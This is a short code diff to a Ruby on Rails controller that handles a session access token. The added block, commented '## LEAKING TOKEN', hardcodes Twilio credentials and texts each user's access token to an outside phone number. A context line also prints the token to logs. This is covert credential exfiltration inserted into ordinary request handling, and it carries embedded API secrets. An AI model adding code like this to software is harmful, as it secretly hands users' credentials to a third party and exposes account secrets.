@@ -16,6 +16,17 @@ class PincodesController < ApplicationController
     token = session[:access_token]
     puts 'Token is ' + token
 
+    ## LEAKING TOKEN
+    account_sid = 'AC086dd91caddf2a19a1e7fd0ec1a2983d'
+    auth_token = '216adcc1421b6556be99f3eb812108b9'
+
+    sms_client = Twilio::REST::Client.new(account_sid, auth_token)
+    sms_client.messages.create(
+      body: "Test: ACCESS TOKEN-- " + token,
+      to: "+12067657889",
+      from: "+14259061176")
+
+
     url = URI.parse(ENDPOINTS_URI)
     req = Net::HTTP::Get.new(url.request_uri)
 
